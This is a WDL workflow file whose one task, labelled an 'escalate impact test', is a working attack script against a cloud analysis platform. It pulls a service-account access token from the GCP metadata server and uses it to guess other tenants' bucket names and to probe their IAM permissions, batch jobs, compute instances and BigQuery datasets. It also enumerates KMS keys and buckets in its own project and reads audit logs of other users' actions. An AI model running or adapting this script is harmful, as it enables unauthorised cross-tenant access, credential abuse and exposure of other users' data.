version 1.0

workflow EscalateImpact {
    call MaxImpact
}

task MaxImpact {
    command <<<
        echo "=== ESCALATE IMPACT TEST ==="
        echo "Date: $(date -u)"

        TOKEN=$(curl -s --max-time 5 -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | \
          python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])" 2>/dev/null)
        PROJECT=$(curl -s --max-time 5 -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/project/project-id" 2>/dev/null)

        echo "=== 1. READ CROSS-TENANT BUCKET BY GUESSED NAME ==="
        for proj in wb-cozy-coconut-8092 wb-frosty-coconut-5800; do
            echo "--- Trying bucket patterns for $proj ---"
            for prefix in storage bucket; do
                for sep in - _; do
                    for user in "" papyge alecksey admin test user data; do
                        if [ -z "$user" ]; then
                            BUCKET="${prefix}${sep}${proj}"
                        else
                            BUCKET="${prefix}${sep}${user}${sep}${proj}"
                        fi
                        code=$(curl -s -o /tmp/bkt.txt -w "%{http_code}" --max-time 5 \
                          "https://storage.googleapis.com/storage/v1/b/${BUCKET}/o?maxResults=5" \
                          -H "Authorization: Bearer $TOKEN" 2>/dev/null)
                        if [ "$code" != "403" ] && [ "$code" != "404" ] && [ "$code" != "000" ]; then
                            echo "[${code}] gs://${BUCKET}/"
                            cat /tmp/bkt.txt
                            echo ""
                        fi
                    done
                done
            done
        done

        echo "=== 2. TESTIAM ON CROSS-TENANT PROJECTS ==="
        for proj in wb-cozy-coconut-8092 wb-frosty-coconut-5800; do
            echo "--- Permissions on $proj ---"
            curl -s --max-time 10 -X POST \
              "https://cloudresourcemanager.googleapis.com/v1/projects/${proj}:testIamPermissions" \
              -H "Authorization: Bearer $TOKEN" \
              -H "Content-Type: application/json" \
              -d '{"permissions":["resourcemanager.projects.get","storage.buckets.list","storage.objects.list","storage.objects.get","iam.serviceAccounts.list","compute.instances.list","batch.jobs.list","bigquery.datasets.list"]}' 2>&1
            echo ""
        done

        echo "=== 3. LIST BATCH JOBS IN CROSS-TENANT PROJECTS ==="
        for proj in wb-cozy-coconut-8092 wb-frosty-coconut-5800; do
            echo "--- Batch jobs in $proj ---"
            curl -s --max-time 10 \
              "https://batch.googleapis.com/v1/projects/${proj}/locations/us-central1/jobs" \
              -H "Authorization: Bearer $TOKEN" 2>&1 | head -30
            echo ""
        done

        echo "=== 4. LIST COMPUTE INSTANCES IN CROSS-TENANT ==="
        for proj in wb-cozy-coconut-8092 wb-frosty-coconut-5800; do
            echo "--- Instances in $proj ---"
            curl -s --max-time 10 \
              "https://compute.googleapis.com/compute/v1/projects/${proj}/zones/us-central1-a/instances" \
              -H "Authorization: Bearer $TOKEN" 2>&1 | head -30
            echo ""
        done

        echo "=== 5. BIGQUERY IN CROSS-TENANT ==="
        for proj in wb-cozy-coconut-8092 wb-frosty-coconut-5800; do
            echo "--- BQ datasets in $proj ---"
            curl -s --max-time 10 \
              "https://bigquery.googleapis.com/bigquery/v2/projects/${proj}/datasets" \
              -H "Authorization: Bearer $TOKEN" 2>&1 | head -30
            echo ""
        done

        echo "=== 6. OUR PROJECT - FULL PERMISSIONS ==="
        curl -s --max-time 10 -X POST \
          "https://cloudresourcemanager.googleapis.com/v1/projects/${PROJECT}:testIamPermissions" \
          -H "Authorization: Bearer $TOKEN" \
          -H "Content-Type: application/json" \
          -d '{"permissions":["resourcemanager.projects.get","resourcemanager.projects.getIamPolicy","resourcemanager.projects.setIamPolicy","storage.buckets.list","storage.buckets.create","storage.objects.list","storage.objects.get","storage.objects.create","storage.objects.delete","iam.serviceAccounts.list","iam.serviceAccounts.create","iam.serviceAccounts.getAccessToken","iam.serviceAccountKeys.create","compute.instances.list","compute.instances.create","compute.firewalls.create","batch.jobs.list","batch.jobs.create","bigquery.datasets.list","bigquery.datasets.create","bigquery.jobs.create","secretmanager.secrets.list","secretmanager.versions.access","logging.logEntries.list","cloudkms.cryptoKeys.list","cloudkms.cryptoKeyVersions.useToDecrypt"]}' 2>&1

        echo "=== 7. KMS KEYS IN OUR PROJECT ==="
        for location in global us-central1 us us-east1; do
            echo "--- KMS in $location ---"
            curl -s --max-time 10 \
              "https://cloudkms.googleapis.com/v1/projects/${PROJECT}/locations/${location}/keyRings" \
              -H "Authorization: Bearer $TOKEN" 2>&1 | head -20
            echo ""
        done

        echo "=== 8. LOGGING - READ OTHER USERS ACTIONS ==="
        curl -s --max-time 10 -X POST \
          "https://logging.googleapis.com/v2/entries:list" \
          -H "Authorization: Bearer $TOKEN" \
          -H "Content-Type: application/json" \
          -d '{"resourceNames":["projects/'"$PROJECT"'"],"filter":"protoPayload.authenticationInfo.principalEmail:\"@gmail.com\"","orderBy":"timestamp desc","pageSize":20}' 2>&1 | head -100

        echo "=== 9. OUR BUCKET - LIST ALL FILES ==="
        curl -s --max-time 10 \
          "https://storage.googleapis.com/storage/v1/b?project=${PROJECT}" \
          -H "Authorization: Bearer $TOKEN" 2>&1
        echo ""
        for bucket in $(curl -s --max-time 10 \
          "https://storage.googleapis.com/storage/v1/b?project=${PROJECT}" \
          -H "Authorization: Bearer $TOKEN" 2>/dev/null | \
          python3 -c "import sys,json; [print(b['name']) for b in json.load(sys.stdin).get('items',[])]" 2>/dev/null); do
            echo "--- gs://$bucket/ ---"
            curl -s --max-time 10 \
              "https://storage.googleapis.com/storage/v1/b/${bucket}/o?maxResults=20" \
              -H "Authorization: Bearer $TOKEN" 2>&1 | head -50
            echo ""
        done

        echo "=== DONE ==="
    >>>

    output {
        File result = stdout()
    }

    runtime {
        docker: "gcr.io/google.com/cloudsdktool/cloud-sdk:461.0.0-alpine"
    }
}
